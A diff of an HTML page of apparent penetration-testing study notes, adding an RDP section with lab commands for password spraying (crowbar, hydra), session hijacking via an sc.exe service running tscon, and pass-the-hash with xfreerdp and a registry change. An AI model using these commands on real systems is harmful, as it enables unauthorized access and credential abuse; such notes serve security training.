@@ -71,6 +71,11 @@
     <label class="md-overlay" for="__drawer"></label>
     <div data-md-component="skip">
       
+        
+        <a href="#rdp-session-hijacking" class="md-skip">
+          Skip to content
+        </a>
+      
     </div>
     <div data-md-component="announce">
       
@@ -890,6 +895,17 @@
       
       
       
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    RDP
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
       <a href="./" class="md-nav__link md-nav__link--active">
         
   
@@ -899,6 +915,41 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Session Hijacking
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Pass-the-Hash (PtH)
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
       
     </li>
   
@@ -1125,6 +1176,26 @@
   
   
     <li class="md-nav__item">
+      <a href="../../passwords/passwords/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Passwords Attack
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
       <a href="../../pivoting/" class="md-nav__link">
         
   
@@ -1152,10 +1223,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_11" >
         
           
-          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_11" id="__nav_11_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1166,8 +1237,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_10">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_11_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_11">
             <span class="md-nav__icon md-icon"></span>
             Walkthrough
           </label>
@@ -1256,10 +1327,10 @@
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_13" >
         
           
-          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
+          <label class="md-nav__link" for="__nav_13" id="__nav_13_label" tabindex="0">
             
   
   <span class="md-ellipsis">
@@ -1270,8 +1341,8 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
-          <label class="md-nav__title" for="__nav_12">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_13_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_13">
             <span class="md-nav__icon md-icon"></span>
             Blue
           </label>
@@ -1323,6 +1394,32 @@
   
   
   
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-session-hijacking" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Session Hijacking
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#rdp-pass-the-hash-pth" class="md-nav__link">
+    <span class="md-ellipsis">
+      RDP Pass-the-Hash (PtH)
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
 </nav>
                   </div>
                 </div>
@@ -1350,6 +1447,23 @@
 <li><code>xfreerdp /u:username /p:password /v:10.129.75.180 /cert-ignore /bpp:8 /network:modem /compression -themes -wallpaper /clipboard /audio-mode:1 /auto-reconnect -glyph-cache /dynamic-resolution /drive:linux,/</code></li>
 </ol>
 </li>
+<li>Crowbar - RDP Password Spraying: <code>crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'</code></li>
+<li>Hydra - RDP Password Spraying: <code>hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp</code></li>
+</ol>
+<h4 id="rdp-session-hijacking"><strong>RDP Session Hijacking</strong></h4>
+<ol>
+<li>To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID (4 for the lewen session in our example) we would like to connect to which session name (rdp-tcp#13, which is our current session): <code>tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}</code></li>
+<li>Escale privileges from local administrator to SYSTEM;<ol>
+<li><code>query user</code></li>
+<li><code>sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"</code></li>
+<li><code>net start sessionhijack</code></li>
+</ol>
+</li>
+</ol>
+<h3 id="rdp-pass-the-hash-pth"><strong>RDP Pass-the-Hash (PtH)</strong></h3>
+<ol>
+<li>Adding the DisableRestrictedAdmin Registry Key: <code>reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f</code></li>
+<li>Once the registry key is added, we can use xfreerdp with the option /pth to gain RDP access: <code>xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9</code></li>
 </ol>
 
 
